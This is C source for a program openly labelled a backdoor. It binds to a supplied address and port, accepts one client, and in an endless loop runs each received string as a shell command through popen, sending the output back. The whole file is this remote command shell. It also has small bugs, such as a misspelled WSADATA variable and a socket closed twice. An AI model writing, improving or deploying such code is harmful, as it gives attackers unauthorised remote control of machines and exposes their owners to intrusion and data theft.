#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#include "backdoor.h"

#ifdef WIN32
    #include <windows.h>
    #include <winsock.h>
#endif

int main(int argc, char *argv[]){

    char *file_name = argv[0];
    char *backdoor_address = argv[1];
    char *backdoor_port = argv[2];
    
    if(argc != 3){
        show_help(file_name);
        exit(1);
    }

    show_banner();

    #ifdef WIN32
        WSADATA wsada;
    #endif

    struct sockaddr_in backdoor;
    struct sockaddr_in client;

    int bytes;
    int size = sizeof(struct sockaddr_in);

    char cmd[1024];

    #ifdef WIN32
        WSAStartup(0x0101, &wsda);
    #endif

    int sockfd_server = create_socket();
    int sockfd_client = create_socket();

    memset(&backdoor, 0, sizeof(backdoor));

    backdoor.sin_family = AF_INET;
    backdoor.sin_port = htons(atoi(backdoor_port));
    backdoor.sin_addr.s_addr = inet_addr(backdoor_address);

    if(bind(sockfd_server, (struct sockaddr *)&backdoor, sizeof(struct sockaddr)) < 0){
        perror("bind");
        exit(1);
    }

    printf("[+]Successfully created bind\n");
 
    if(listen(sockfd_server, SERVER_BACKLOG)){
        perror("listen");
        exit(1);
    }
    
    printf("[+]listening...\n");
    printf("[+]Server: %s\n", backdoor_address);
    printf("[+]Port: %d\n", atoi(backdoor_port));
    
    if((sockfd_client = accept(sockfd_server, (struct sockaddr *) &client, &size)) < 0){
        perror("socket");
        exit(1);
    }


    while(1){
        
        memset(cmd, 0, sizeof(cmd));

        if((bytes = recv(sockfd_client, cmd, 50, 0)) < 0){
            perror("recv");
            exit(1);
        }

        cmd[bytes] = '\0';

        FILE *exec = popen(cmd, "r");
        char output[1024];

        memset(&output, 0, sizeof(output));
        
        while(fgets(output, sizeof(output), exec) != 0){
            //printf("%s", output);
            send(sockfd_client, output, sizeof(output), 0);
        }

//       execvp(cmd, NULL);
        pclose(exec);
    }


    #ifdef WIN32
        WSACleanup();
    #endif

    close(sockfd_client);
    close(sockfd_client);

    return 0;
}
